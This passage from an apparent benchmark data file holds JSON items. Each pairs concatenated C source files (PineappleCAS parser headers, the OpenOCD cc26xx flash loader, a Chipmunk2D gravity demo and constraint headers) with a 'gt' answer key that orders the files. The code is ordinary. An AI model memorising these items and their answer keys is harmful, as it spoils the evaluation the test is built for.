0;\n        return NULL;\n    }\n\n    data = malloc(*len);\n    _to_binary(e, data, 0, lookup, err);\n\n    return data;\n}\n\n'PineappleCAS/src/parser.h'\n:#ifndef PARSER_H_\n#define PARSER_H_\n\n#include \"ast.h\"\n#include \"error.h\"\n\n#define is_tok_unary_operator(tok)    ((tok) >= TOK_NEGATE && (tok) <= TOK_FACTORIAL)\n#define is_tok_binary_operator(tok)   ((tok) >= TOK_PLUS && (tok) <= TOK_ROOT)\n#define is_tok_operator(tok) (is_tok_unary_operator(tok) || is_tok_binary_operator(tok))\n\n#define is_tok_unary_function(tok)    ((tok) >= TOK_INT && (tok) <= TOK_TANH_INV)\n#define is_tok_nary_function(tok)     ((tok) == TOK_LOG_BASE || (tok) == TOK_DERIV)\n#define is_tok_function(tok)          (is_tok_unary_function(tok) || is_tok_nary_function(tok))\n\n\ntypedef enum _TokenType {\n    TOK_NUMBER, TOK_SYMBOL,\n\n    TOK_PLUS, TOK_MINUS,\n    TOK_MULTIPLY, TOK_DIVIDE,\n    TOK_FRACTION,\n    TOK_PROPER,\n    TOK_POWER,\n    TOK_SCIENTIFIC,\n    TOK_ROOT,\n\n\n    TOK_NEGATE,\n    TOK_RECIPROCAL, TOK_SQUARE, TOK_CUBE,\n    TOK_FACTORIAL,\n\n    TOK_LOG_BASE,\n    TOK_DERIV,\n\n    TOK_INT, TOK_ABS,\n\n    TOK_SQRT, TOK_CUBED_ROOT,\n\n    TOK_LN, TOK_E_TO_POWER,\n    TOK_LOG, TOK_10_TO_POWER,\n\n    TOK_SIN, TOK_SIN_INV,\n    TOK_COS, TOK_COS_INV,\n    TOK_TAN, TOK_TAN_INV,\n    TOK_SINH, TOK_SINH_INV,\n    TOK_COSH, TOK_COSH_INV,\n    TOK_TANH, TOK_TANH_INV,\n\n    TOK_OPEN_PAR, TOK_CLOSE_PAR, TOK_COMMA, TOK_PERIOD,\n\n    TOK_IMAG,\n\n    TOK_EULER, TOK_PI, TOK_THETA,\n\n    AMOUNT_TOKENS, TOK_INVALID\n} TokenType;\n\n#define MAX_IDENTIFIER_LEN 7\n\nstruct Identifier {\n    uint8_t length;\n    uint8_t bytes[MAX_IDENTIFIER_LEN];\n};\n\nextern struct Identifier ti_table[AMOUNT_TOKENS];\nextern struct Identifier str_table[AMOUNT_TOKENS];\n\npcas_ast_t *parse(const uint8_t *equation, unsigned length, struct Identifier *lookup, pcas_error_t *e);\nuint8_t *export_to_binary(pcas_ast_t *e, unsigned *len, struct Identifier *lookup, pcas_error_t *err);\n\n#endif\n'PineappleCAS/src/error.h'\n:#ifndef ERROR_H_\n#define ERROR_H_\n\ntypedef enum {\n    E_SUCCESS,\n\n\n    E_GENERIC,\n\n\n    E_AST_NOT_ALLOWED,\n    E_AST_OUT_OF_BOUNDS,\n\n\n    E_TOK_INVALID,\n\n    E_PARSE_BAD_OPERATOR,\n    E_PARSE_UNMATCHED_CLOSE_PAR,\n    E_PARSE_BAD_COMMA,\n\n    E_EVAL_NO_MAPPING,\n\n    AMOUNT_ERRORS\n} pcas_error_t;\n\nextern const char *error_text[AMOUNT_ERRORS];\n\n#endif",
        "gt": [
            "'PineappleCAS/src/error.h'",
            "'PineappleCAS/src/ast.h'",
            "'PineappleCAS/src/parser.h'",
            "'PineappleCAS/src/export.c'"
        ]
    },
    {
        "files": [
            "'OpenOCD/contrib/loaders/flash/cc26xx/flashloader.h'",
            "'OpenOCD/contrib/loaders/flash/cc26xx/flash.h'",
            "'OpenOCD/contrib/loaders/flash/cc26xx/flashloader.c'"
        ],
        "content": "'OpenOCD/contrib/loaders/flash/cc26xx/flashloader.h'\n:\n\n\n\n#ifndef OPENOCD_LOADERS_FLASH_CC26XX_FLASHLOADER_H\n#define OPENOCD_LOADERS_FLASH_CC26XX_FLASHLOADER_H\n\n#include <stdint.h>\n#include <stdbool.h>\n#include <string.h>\n#include \"flash.h\"\n\n\n#define NELEMS(a) (sizeof(a) / sizeof(a[0]))\n\nstruct __attribute__((__packed__)) flash_params {\n\tuint32_t dest;\n\tuint32_t len;\n\tuint32_t cmd;\n\tuint32_t full;\n\tuint32_t buf_addr;\n};\n\ntypedef enum {\n\tCMD_NO_ACTION = 0,\n\tCMD_ERASE_ALL = 1,\n\tCMD_PROGRAM = 2,\n\tCMD_ERASE_AND_PROGRAM = 3,\n\tCMD_ERASE_AND_PROGRAM_WITH_RETAIN = 4,\n\n\tCMD_ERASE_SECTORS = 5\n} flash_commands_t;\n\ntypedef enum {\n\tBUFFER_EMPTY = 0x0,\n\tBUFFER_FULL = 0xFFFFFFFF\n} flash_handshake_t;\n\n#define STATUS_FLASHLOADER_STATUS_M 0x0000FFFF\n#define STATUS_FLASHLOADER_STATUS_S 0\n#define STATUS_ROM_CODE_M           0x00FF0000\n#define STATUS_ROM_CODE_S           16\n#define STATUS_EXT_INFO_M           0xFF000000\n#define STATUS_EXT_INFO_S           24\n\ntypedef enum {\n\tSTATUS_OK = 0,\n\tSTATUS_FAILED_ERASE_ALL = 0x101,\n\tSTATUS_FAILED_SECTOR_ERASE = 0x102,\n\tSTATUS_FAILED_PROGRAM = 0x103,\n\tSTATUS_FAILED_INVALID_ARGUMENTS = 0x104,\n\tSTATUS_FAILED_UNKNOWN_COMMAND = 0x105,\n} flash_status_t;\n\n\n#define BUFFER_LEN FLASH_ERASE_SIZE\n\n\nextern uint32_t flashloader_init(struct flash_params *params, uint8_t *buf1,\n\tuint8_t *buf2);\n\n\nextern uint32_t flashloader_erase_and_program(uint8_t *src, uint32_t address,\n\tuint32_t byte_count);\n\n\nextern uint32_t flashloader_program_with_retain(uint8_t *src, uint32_t address,\n\tuint32_t byte_count);\n\n\nextern uint32_t flashloader_erase_all(void);\n\n\nextern uint32_t flashloader_erase_sectors(uint32_t start_addr,\n\tuint32_t byte_count);\n\n\nextern uint32_t flashloader_program(uint8_t *src, uint32_t address,\n\tuint32_t byte_count);\n\n\nstatic inline uint32_t flashloader_address_to_sector(uint32_t address)\n\t{ return (address / FLASH_ERASE_SIZE); };\n\n#endif\n\n'OpenOCD/contrib/loaders/flash/cc26xx/flash.h'\n:\n\n\n\n#ifndef OPENOCD_LOADERS_FLASH_CC26XX_FLASH_H\n#define OPENOCD_LOADERS_FLASH_CC26XX_FLASH_H\n\n#ifdef __cplusplus\nextern \"C\"\n{\n#endif\n\n#include <stdint.h>\n#include <stdbool.h>\n#include \"hw_regs.h\"\n\n\n#define FLASHMEM_BASE 0\n\n\n#define ROM_API_TABLE       ((uint32_t *) 0x10000180)\n#define ROM_VERSION         (ROM_API_TABLE[0])\n#define ROM_API_FLASH_TABLE ((uint32_t *) (ROM_API_TABLE[10]))\n\n#if defined(DEVICE_CC26X2)\n\n\n\n#define FLASH_ERASE_SIZE       8192\n\n#define FLASH_MAX_SECTOR_COUNT 132\n#define FLASH_SECTOR_BASE_M    0xFFFFE000\n\n\n#define CCFG_O_BL_CONFIG 0x00001FD8\n\n#elif defined(DEVICE_CC26X0)\n\n\n\n#define FLASH_ERASE_SIZE       4096\n\n#define FLASH_MAX_SECTOR_COUNT 32\n#define FLASH_SECTOR_BASE_M    0xFFFFF000\n\n\n#define CCFG_O_BL_CONFIG 0x00000FD8\n\n#else\n#error No DEVICE defined.\n#endif\n\n\n#define FAPI_STATUS_SUCCESS   0x00000000\n#define FAPI_STATUS_FSM_BUSY  0x00000001\n#define FAPI_STATUS_FSM_READY 0x00000002\n#define FAPI_STATUS_INCORRECT_DATABUFFER_LENGTH \\\n\t\t\t\t\t\t\t  0x00000003\n#define FAPI_STATUS_FSM_ERROR 0x00000004\n\n\n#define ADDR_OFFSET (0x1F800000 - FLASHMEM_BASE)\n\n\n#define FCFG1_OFFSET 0x1000\n\n\n#define FLASH_MODULE_CLK_FREQ 48\n\n\ntypedef enum {\n\tFAPI_PROGRAM_DATA    = 0x0002,\n\tFAPI_ERASE_SECTOR    = 0x0006,\n\tFAPI_ERASE_BANK      = 0x0008,\n\tFAPI_VALIDATE_SECTOR = 0x000E,\n\tFAPI_CLEAR_STATUS    = 0x0010,\n\tFAPI_PROGRAM_RESUME  = 0x0014,\n\tFAPI_ERASE_RESUME    = 0x0016,\n\tFAPI_CLEAR_MORE      = 0x0018,\n\tFAPI_PROGRAM_SECTOR  = 0x0020,\n\tFAPI_ERASE_OTP       = 0x0030\n} flash_state_command_t;\n\n\n#define FSM_REG_WRT_ENABLE  5\n#define FSM_REG_WRT_DISABLE 2\n\n\n#define FBFALLBACK_SLEEP      0\n#define FBFALLBACK_DEEP_STDBY 1\n#define FBFALLBACK_ACTIVE     3\n\n\n#define FLASH_BAGP 0x14\n#define FLASH_PAGP 0x14\n\n\n#define FW_WRT_TRIMMED 0x00000001\n\n\ntypedef volatile uint8_t fwp_write_byte;\n#define FWPWRITE_BYTE_ADDRESS \\\n\t((fwp_write_byte *)((FLASH_BASE + FLASH_O_FWPWRITE0)))\n\n\n#define FLASH_CMD_EXEC 0x15\n\n\nstatic inline uint32_t flash_sector_size_get(void)\n{\n\tuint32_t sector_size_in_kbyte;\n\n\tsector_size_in_kbyte = (HWREG(FLASH_BASE + FLASH_O_FCFG_B0_SSIZE0) &\n\t\tFLASH_FCFG_B0_SSIZE0_B0_SECT_SIZE_M) >>\n\t\tFLASH_FCFG_B0_SSIZE0_B0_SECT_SIZE_S;\n\n\n\treturn sector_size_in_kbyte * 1024;\n}\n\n\nstatic inline uint32_t flash_size_get(void)\n{\n\tuint32_t num_of_sectors;\n\n\n\tnum_of_sectors = (HWREG(FLASH_BASE + FLASH_O_FLASH_SIZE) &\n\t\t\t\t\t\tFLASH_FLASH_SIZE_SECTORS_M) >>\n\t\t\t\t\t\tFLASH_FLASH_SIZE_SECTORS_S;\n\n\n\treturn num_of_sectors * flash_sector_size_get();\n}\n\n\nstatic inline uint32_t flash_check_fsm_for_error(void)\n{\n\tif (HWREG(FLASH_BASE + FLASH_O_FMSTAT) & FLASH_FMSTAT_CSTAT)\n\t\treturn FAPI_STATUS_FSM_ERROR;\n\telse\n\t\treturn FAPI_STATUS_SUCCESS;\n}\n\n\nstatic inline uint32_t flash_check_fsm_for_ready(void)\n{\n\tif (HWREG(FLASH_BASE + FLASH_O_STAT) & FLASH_STAT_BUSY)\n\t\treturn FAPI_STATUS_FSM_BUSY;\n\telse\n\t\treturn FAPI_STATUS_FSM_READY;\n}\n\n\nextern uint32_t flash_sector_erase(uint32_t sector_address);\n\n\nextern uint32_t flash_bank_erase(bool force_precondition);\n\n\nextern uint32_t flash_program(uint8_t *data_buffer, uint32_t address,\n\tuint32_t count);\n\n\nextern void flash_disable_sectors_for_write(void);\n\n#ifdef __cplusplus\n}\n#endif\n\n#endif\n\n'OpenOCD/contrib/loaders/flash/cc26xx/flashloader.c'\n:\n\n\n\n#include <stdint.h>\n#include <stdbool.h>\n#include \"flashloader.h\"\n#include \"flash.h\"\n\n\nstatic bool g_is_erased[FLASH_MAX_SECTOR_COUNT];\n\nextern uint8_t g_retain_buf[];\n\nuint32_t flashloader_init(struct flash_params *params, uint8_t *buf1,\n\tuint8_t *buf2)\n{\n\n\tmemset((void *)params, 0, 2 * sizeof(struct flash_params));\n\tparams[0].buf_addr = (uint32_t)buf1;\n\tparams[1].buf_addr = (uint32_t)buf2;\n\n\n\tmemset(g_is_erased, false, sizeof(g_is_erased));\n\n\treturn STATUS_OK;\n}\n\nuint32_t flashloader_erase_and_program(uint8_t *src, uint32_t address,\n\tuint32_t byte_count)\n{\n\tif (byte_count > BUFFER_LEN)\n\t\treturn STATUS_FAILED_INVALID_ARGUMENTS;\n\n\n\tuint32_t status = flashloader_erase_sectors(address, byte_count);\n\n\tif (status != STATUS_OK)\n\t\treturn status;\n\n\n\tstatus = flashloader_program(src, address, byte_count);\n\n\treturn status;\n}\n\nuint32_t flashloader_program_with_retain(uint8_t *src, uint32_t address,\n\tuint32_t byte_count)\n{\n#if (BUFFER_LEN > FLASH_ERASE_SIZE)\n#error Buffer size cannot be larger than the flash sector size!\n#endif\n\n\tuint32_t first_sector_idx;\n\tuint32_t last_sector_idx;\n\tuint32_t status = STATUS_OK;\n\tuint32_t i;\n\n\tfirst_sector_idx = flashloader_address_to_sector(address);\n\tlast_sector_idx = flashloader_address_to_sector(address + byte_count - 1);\n\n\n\tmemset(g_is_erased, false, sizeof(g_is_erased));\n\n\tuint32_t sec_offset = address % FLASH_ERASE_SIZE;\n\tuint32_t curr_count;\n\tuint32_t src_offset = 0;\n\n\tfor (i = first_sector_idx; i <= last_sector_idx; i++) {\n\n\n\t\tcurr_count = byte_count;\n\t\tif ((address + byte_count) > ((i+1) * FLASH_ERASE_SIZE))\n\t\t\tcurr_count -= (address + byte_count) % FLASH_ERASE_SIZE;\n\n\n\t\tmemcpy(g_retain_buf, (void *)(i * FLASH_ERASE_SIZE), FLASH_ERASE_SIZE);\n\n\n\t\tmemcpy(&g_retain_buf[sec_offset], &src[src_offset], curr_count);\n\n\n\t\tstatus = flashloader_erase_and_program(g_retain_buf,\n\t\t\t\t\t(i * FLASH_ERASE_SIZE), FLASH_ERASE_SIZE);\n\t\tif (status != STATUS_OK)\n\t\t\treturn status;\n\n\t\taddress += curr_count;\n\t\tsec_offset = address % FLASH_ERASE_SIZE;\n\t\tbyte_count -= curr_count;\n\t\tsrc_offset += curr_count;\n\t}\n\n\treturn status;\n}\n\nuint32_t flashloader_erase_all(void)\n{\n\tif (flash_bank_erase(true) != FAPI_STATUS_SUCCESS)\n\t\treturn STATUS_FAILED_ERASE_ALL;\n\n\tmemset(g_is_erased, true, sizeof(g_is_erased));\n\n\treturn STATUS_OK;\n}\n\nuint32_t flashloader_erase_sectors(uint32_t address, uint32_t byte_count)\n{\n\tuint32_t first_sector_idx;\n\tuint32_t last_sector_idx;\n\tuint32_t status;\n\tuint32_t idx;\n\n\n\tfirst_sector_idx = flashloader_address_to_sector(address);\n\tlast_sector_idx = flashloader_address_to_sector(address + byte_count - 1);\n\n\n\tfor (idx = first_sector_idx; idx <= last_sector_idx; idx++) {\n\n\n\t\tif (g_is_erased[idx] == false) {\n\t\t\tstatus = flash_sector_erase(idx * FLASH_ERASE_SIZE);\n\t\t\tif (status != FAPI_STATUS_SUCCESS) {\n\t\t\t\tstatus = (STATUS_FAILED_SECTOR_ERASE |\n\t\t\t\t\t\t((idx << STATUS_EXT_INFO_S) & STATUS_EXT_INFO_M) |\n\t\t\t\t\t\t((status << STATUS_ROM_CODE_S) & STATUS_ROM_CODE_M));\n\t\t\t\treturn status;\n\t\t\t}\n\t\t\tg_is_erased[idx] = true;\n\t\t}\n\t}\n\n\treturn STATUS_OK;\n}\n\nuint32_t flashloader_program(uint8_t *src, uint32_t address,\n\tuint32_t byte_count)\n{\n\tuint32_t status = flash_program(src, address, byte_count);\n\tif (status != FAPI_STATUS_SUCCESS) {\n\t\tstatus = (STATUS_FAILED_PROGRAM |\n\t\t\t\t\t((status << STATUS_ROM_CODE_S) & STATUS_ROM_CODE_M));\n\t}\n\n\treturn STATUS_OK;\n}\n",
        "gt": [
            "'OpenOCD/contrib/loaders/flash/cc26xx/flash.h'",
            "'OpenOCD/contrib/loaders/flash/cc26xx/flashloader.h'",
            "'OpenOCD/contrib/loaders/flash/cc26xx/flashloader.c'"
        ]
    },
    {
        "files": [
            "'Chipmunk2D/demo/Planet.c'",
            "'Chipmunk2D/include/chipmunk/chipmunk.h'",
            "'Chipmunk2D/include/chipmunk/cpConstraint.h'",
            "'Chipmunk2D/include/chipmunk/cpGrooveJoint.h'"
        ],
        "content": "'Chipmunk2D/demo/Planet.c'\n:\n\n#include \"chipmunk/chipmunk.h\"\n#include \"ChipmunkDemo.h\"\n\nstatic cpBody *planetBody;\n\nstatic cpFloat gravityStrength = 5.0e6f;\n\nstatic void\nupdate(cpSpace *space, double dt)\n{\n\tcpSpaceStep(space, dt);\n}\n\nstatic void\nplanetGravityVelocityFunc(cpBody *body, cpVect gravity, cpFloat damping, cpFloat dt)\n{\n\n\n\n\tcpVect p = cpBodyGetPosition(body);\n\tcpFloat sqdist = cpvlengthsq(p);\n\tcpVect g = cpvmult(p, -gravityStrength / (sqdist * cpfsqrt(sqdist)));\n\n\tcpBodyUpdateVelocity(body, g, damping, dt);\n}\n\nstatic cpVect\nrand_pos(cpFloat radius)\n{\n\tcpVect v;\n\tdo {\n\t\tv = cpv(frand()*(640 - 2*radius) - (320 - radius), frand()*(480 - 2*radius) - (240 - radius));\n\t} while(cpvlength(v) < 85.0f);\n\n\treturn v;\n}\n\nstatic void\nadd_box(cpSpace *space)\n{\n\tconst cpFloat size = 10.0f;\n\tconst cpFloat mass = 1.0f;\n\n\tcpVect verts[4] = {\n\t\tcpv(-size,-size),\n\t\tcpv(-size, size),\n\t\tcpv( size, size),\n\t\tcpv( size,-size),\n\t};\n\n\tcpFloat radius = cpvlength(cpv(size, size));\n\tcpVect pos = rand_pos(radius);\n\n\tcpBody *body = cpSpaceAddBody(space, cpBodyNew(mass, cpMomentForPoly(mass, 4, verts, cpvzero, 0.0f)));\n\tcpBodySetVelocityUpdateFunc(body, planetGravityVelocityFunc);\n\tcpBodySetPosition(body, pos);\n\n\n\n\tcpFloat r = cpvlength(pos);\n\tcpFloat v = cpfsqrt(gravityStrength / r) / r;\n\tcpBodySetVelocity(body, cpvmult(cpvperp(pos), v));\n\n\n\n\tcpBodySetAngularVelocity(body, v);\n\tcpBodySetAngle(body, cpfatan2(pos.y, pos.x));\n\n\tcpShape *shape = cpSpaceAddShape(space, cpPolyShapeNew(body, 4, verts, cpTransformIdentity, 0.0));\n\tcpShapeSetElasticity(shape, 0.0f);\n\tcpShapeSetFriction(shape, 0.7f);\n}\n\nstatic cpSpace *\ninit(void)\n{\n\tcpSpace *space = cpSpaceNew();\n\tcpSpaceSetIterations(space, 20);\n\n\n\tplanetBody = cpSpaceAddBody(space, cpBodyNewKinematic());\n\tcpBodySetAngularVelocity(planetBody, 0.2f);\n\n\tfor(int i=0; i<30; i++){\n\t\tadd_box(space);\n\t}\n\n\tcpShape *shape = cpSpaceAddShape(space, cpCircleShapeNew(planetBody, 70.0f, cpvzero));\n\tcpShapeSetElasticity(shape, 1.0f);\n\tcpShapeSetFriction(shape, 1.0f);\n\tcpShapeSetFilter(shape, NOT_GRABBABLE_FILTER);\n\n\treturn space;\n}\n\nstatic void\ndestroy(cpSpace *space)\n{\n\tChipmunkDemoFreeSpaceChildren(space);\n\tcpSpaceFree(space);\n}\n\nChipmunkDemo Planet = {\n\t\"Planet\",\n\t1.0/60.0,\n\tinit,\n\tupdate,\n\tChipmunkDemoDefaultDrawImpl,\n\tdestroy,\n};\n\n'Chipmunk2D/include/chipmunk/chipmunk.h'\n:\n\n#ifndef CHIPMUNK_H\n#define CHIPMUNK_H\n\n#include <stdlib.h>\n#include <math.h>\n\n#ifndef alloca\n\t#ifdef _WIN32\n\t\t#include <malloc.h>\n\t#elif defined(__FreeBSD__)\n\n\t#else\n\t\t#include <alloca.h>\n\t#endif\n#endif\n\n#ifdef _WIN32\n\t#define CP_EXPORT __declspec(dllexport)\n#else\n\t#define CP_EXPORT\n#endif\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\nCP_EXPORT void cpMessage(const char *condition, const char *file, int line, int isError, int isHardError, const char *message, ...);\n#ifdef NDEBUG\n\t#define\tcpAssertWarn(__condition__, ...)\n\t#define\tcpAssertSoft(__condition__, ...)\n#else\n\t#define cpAssertSoft(__condition__, ...) if(!(__condition__)){cpMessage(#__condition__, __FILE__, __LINE__, 1, 0, __VA_ARGS__); abort();}\n\t#define cpAssertWarn(__condition__, ...) if(!(__condition__)) cpMessage(#__condition__, __FILE__, __LINE__, 0, 0, __VA_ARGS__)\n#endif\n\n\n#define cpAssertHard(__condition__, ...) if(!(__condition__)){cpMessage(#__condition__, __FILE__, __LINE__, 1, 1, __VA_ARGS__); abort();}\n\n#include \"chipmunk_types.h\"\n\n\n\n\n\n#ifndef CP_BUFFER_BYTES\n\t#define CP_BUFFER_BYTES (32*1024)\n#endif\n\n#ifndef cpcalloc\n\n\t#define cpcalloc calloc\n#endif\n\n#ifndef cprealloc\n\n\t#define cprealloc realloc\n#endif\n\n#ifndef cpfree\n\n\t#define cpfree free\n#endif\n\ntypedef struct cpArray cpArray;\ntypedef struct cpHashSet cpHashSet;\n\ntypedef struct cpBody cpBody;\n\ntypedef struct cpShape cpShape;\ntypedef struct cpCircleShape cpCircleShape;\ntypedef struct cpSegmentShape cpSegmentShape;\ntypedef struct cpPolyShape cpPolyShape;\n\ntypedef struct cpConstraint cpConstraint;\ntypedef struct cpPinJoint cpPinJoint;\ntypedef struct cpSlideJoint cpSlideJoint;\ntypedef struct cpPivotJoint cpPivotJoint;\ntypedef struct cpGrooveJoint cpGrooveJoint;\ntypedef struct cpDampedSpring cpDampedSpring;\ntypedef struct cpDampedRotarySpring cpDampedRotarySpring;\ntypedef struct cpRotaryLimitJoint cpRotaryLimitJoint;\ntypedef struct cpRatchetJoint cpRatchetJoint;\ntypedef struct cpGearJoint cpGearJoint;\ntypedef struct cpSimpleMotorJoint cpSimpleMotorJoint;\n\ntypedef struct cpCollisionHandler cpCollisionHandler;\ntypedef struct cpContactPointSet cpContactPointSet;\ntypedef struct cpArbiter cpArbiter;\n\ntypedef struct cpSpace cpSpace;\n\n#include \"cpVect.h\"\n#include \"cpBB.h\"\n#include \"cpTransform.h\"\n#include \"cpSpatialIndex.h\"\n\n#include \"cpArbiter.h\"\n\n#include \"cpBody.h\"\n#include \"cpShape.h\"\n#include \"cpPolyShape.h\"\n\n#include \"cpConstraint.h\"\n\n#include \"cpSpace.h\"\n\n\n#define CP_VERSION_MAJOR 7\n#define CP_VERSION_MINOR 0\n#define CP_VERSION_RELEASE 3\n\n\nCP_EXPORT extern const char *cpVersionString;\n\n\n\nCP_EXPORT cpFloat cpMomentForCircle(cpFloat m, cpFloat r1, cpFloat r2, cpVect offset);\n\n\n\nCP_EXPORT cpFloat cpAreaForCircle(cpFloat r1, cpFloat r2);\n\n\n\nCP_EXPORT cpFloat cpMomentForSegment(cpFloat m, cpVect a, cpVect b, cpFloat radius);\n\n\nCP_EXPORT cpFloat cpAreaForSegment(cpVect a, cpVect b, cpFloat radius);\n\n\nCP_EXPORT cpFloat cpMomentForPoly(cpFloat m, int count, const cpVect *verts, cpVect offset, cpFloat radius);\n\n\n\nCP_EXPORT cpFloat cpAreaForPoly(const int count, const cpVect *verts, cpFloat radius);\n\n\nCP_EXPORT cpVect cpCentroidForPoly(const int count, const cpVect *verts);\n\n\nCP_EXPORT cpFloat cpMomentForBox(cpFloat m, cpFloat width, cpFloat height);\n\n\nCP_EXPORT cpFloat cpMomentForBox2(cpFloat m, cpBB box);\n\n\n\n\n\nCP_EXPORT int cpConvexHull(int count, const cpVect *verts, cpVect *result, int *first, cpFloat tol);\n\n\n\n\n\n#define CP_CONVEX_HULL(__count__, __verts__, __count_var__, __verts_var__) \\\ncpVect *__verts_var__ = (cpVect *)alloca(__count__*sizeof(cpVect)); \\\nint __count_var__ = cpConvexHull(__count__, __verts__, __verts_var__, NULL, 0.0); \\\n\n\nstatic inline cpVect\ncpClosetPointOnSegment(const cpVect p, const cpVect a, const cpVect b)\n{\n\tcpVect delta = cpvsub(a, b);\n\tcpFloat t = cpfclamp01(cpvdot(delta, cpvsub(p, b))/cpvlengthsq(delta));\n\treturn cpvadd(b, cpvmult(delta, t));\n}\n\n#if defined(__has_extension)\n#if __has_extension(blocks)\n\n\n\n\nvoid cpSpaceEachBody_b(cpSpace *space, void (^block)(cpBody *body));\nvoid cpSpaceEachShape_b(cpSpace *space, void (^block)(cpShape *shape));\nvoid cpSpaceEachConstraint_b(cpSpace *space, void (^block)(cpConstraint *constraint));\n\nvoid cpBodyEachShape_b(cpBody *body, void (^block)(cpShape *shape));\nvoid cpBodyEachConstraint_b(cpBody *body, void (^block)(cpConstraint *constraint));\nvoid cpBodyEachArbiter_b(cpBody *body, void (^block)(cpArbiter *arbiter));\n\ntypedef void (^cpSpacePointQueryBlock)(cpShape *shape, cpVect point, cpFloat distance, cpVect gradient);\nvoid cpSpacePointQuery_b(cpSpace *space, cpVect point, cpFloat maxDistance, cpShapeFilter filter, cpSpacePointQueryBlock block);\n\ntypedef void (^cpSpaceSegmentQueryBlock)(cpShape *shape, cpVect point, cpVect normal, cpFloat alpha);\nvoid cpSpaceSegmentQuery_b(cpSpace *space, cpVect start, cpVect end, cpFloat radius, cpShapeFilter filter, cpSpaceSegmentQueryBlock block);\n\ntypedef void (^cpSpaceBBQueryBlock)(cpShape *shape);\nvoid cpSpaceBBQuery_b(cpSpace *space, cpBB bb, cpShapeFilter filter, cpSpaceBBQueryBlock block);\n\ntypedef void (^cpSpaceShapeQueryBlock)(cpShape *shape, cpContactPointSet *points);\ncpBool cpSpaceShapeQuery_b(cpSpace *space, cpShape *shape, cpSpaceShapeQueryBlock block);\n\n#endif\n#endif\n\n\n\n\n#ifdef __cplusplus\n}\n\nstatic inline cpVect operator *(const cpVect v, const cpFloat s){return cpvmult(v, s);}\nstatic inline cpVect operator +(const cpVect v1, const cpVect v2){return cpvadd(v1, v2);}\nstatic inline cpVect operator -(const cpVect v1, const cpVect v2){return cpvsub(v1, v2);}\nstatic inline cpBool operator ==(const cpVect v1, const cpVect v2){return cpveql(v1, v2);}\nstatic inline cpVect operator -(const cpVect v){return cpvneg(v);}\n\n#endif\n#endif\n\n'Chipmunk2D/include/chipmunk/cpConstraint.h'\n:\n\n\n\n\n\ntypedef void (*cpConstraintPreSolveFunc)(cpConstraint *constraint, cpSpace *space);\n\ntypedef void (*cpConstraintPostSolveFunc)(cpConstraint *constraint, cpSpace *space);\n\n\nCP_EXPORT void cpConstraintDestroy(cpConstraint *constraint);\n\nCP_EXPORT void cpConstraintFree(cpConstraint *constraint);\n\n\nCP_EXPORT cpSpace* cpConstraintGetSpace(const cpConstraint *constraint);\n\n\nCP_EXPORT cpBody* cpConstraintGetBodyA(const cpConstraint *constraint);\n\n\nCP_EXPORT cpBody* cpConstraintGetBodyB(const cpConstraint *constraint);\n\n\nCP_EXPORT cpFloat cpConstraintGetMaxForce(const cpConstraint *constraint);\n\nCP_EXPORT void cpConstraintSetMaxForce(cpConstraint *constraint, cpFloat maxForce);\n\n\nCP_EXPORT cpFloat cpConstraintGetErrorBias(const cpConstraint *constraint);\n\n\n\nCP_EXPORT void cpConstraintSetErrorBias(cpConstraint *constraint, cpFloat errorBias);\n\n\nCP_EXPORT cpFloat cpConstraintGetMaxBias(const cpConstraint *constraint);\n\nCP_EXPORT void cpConstraintSetMaxBias(cpConstraint *constraint, cpFloat maxBias);\n\n\nCP_EXPORT cpBool cpConstraintGetCollideBodies(const cpConstraint *constraint);\n\nCP_EXPORT void cpConstraintSetCollideBodies(cpConstraint *constraint, cpBool collideBodies);\n\n\nCP_EXPORT cpConstraintPreSolveFunc cpConstraintGetPreSolveFunc(const cpConstraint *constraint);\n\nCP_EXPORT void cpConstraintSetPreSolveFunc(cpConstraint *constraint, cpConstraintPreSolveFunc preSolveFunc);\n\n\nCP_EXPORT cpConstraintPostSolveFunc cpConstraintGetPostSolveFunc(const cpConstraint *constraint);\n\nCP_EXPORT void cpConstraintSetPostSolveFunc(cpConstraint *constraint, cpConstraintPostSolveFunc postSolveFunc);\n\n\nCP_EXPORT cpDataPointer cpConstraintGetUserData(const cpConstraint *constraint);\n\nCP_EXPORT void cpConstraintSetUserData(cpConstraint *constraint, cpDataPointer userData);\n\n\nCP_EXPORT cpFloat cpConstraintGetImpulse(cpConstraint *constraint);\n\n#include \"cpPinJoint.h\"\n#include \"cpSlideJoint.h\"\n#include \"cpPivotJoint.h\"\n#include \"cpGrooveJoint.h\"\n#include \"cpDampedSpring.h\"\n#include \"cpDampedRotarySpring.h\"\n#include \"cpRotaryLimitJoint.h\"\n#include \"cpRatchetJoint.h\"\n#include \"cpGearJoint.h\"\n#include \"cpSimpleMotor.h\"\n\n\n\n'Chipmunk2D/include/chipmunk/cpGrooveJoint.h'\n:\n\n\n\n\n\nCP_EXPORT cpBool cpConstraintIsGrooveJoint(const cpConstraint *constraint);\n\n\nCP_EXPORT cpGrooveJoint* cpGrooveJointAlloc(void);\n\nCP_EXPORT cpGrooveJoint* cpGrooveJointInit(cpGrooveJoint *joint, cpBody *a, cpBody *b, cpVect groove_a, cpVect groove_b, cpVect anchorB);\n\nCP_EXPORT cpConstraint* cpGrooveJointNew(cpBody *a, cpBody *b, cpVect groove_a, cpVect groove_b, cpVect anchorB);\n\n\nCP_EXPORT cpVect cpGrooveJointGetGrooveA(const cpConstraint *constraint);\n\nCP_EXPORT void cpGrooveJointSetGrooveA(cpConstraint *constraint, cpVect grooveA);\n\n\nCP_EXPORT cpVect cpGrooveJointGetGrooveB(const cpConstraint *constraint);\n\nCP_EXPORT void cpGrooveJointSetGrooveB(cpConstraint *constraint, cpVect grooveB);\n\n\nCP_EXPORT cpVect cpGrooveJointGetAnchorB(const cpConstraint *constraint);\n\nCP_EXPORT void cpGrooveJointSetAnchorB(cpConstraint *constraint, cpVect anchorB);\n\n\n",
        "gt": [
            "'Chipmunk2D/include/chipmunk/cpGrooveJoint.h'",
            "'Chipmunk2D/include/chipmunk/cpConstraint.h'",
            "'Chipmunk2D/include/chipmunk/chipmunk.h'",
            "'Chipmunk2D/demo/Planet.c'"
        ]
    },
    {
        "files": [
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerMutate.h'",
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerDictionary.h'",
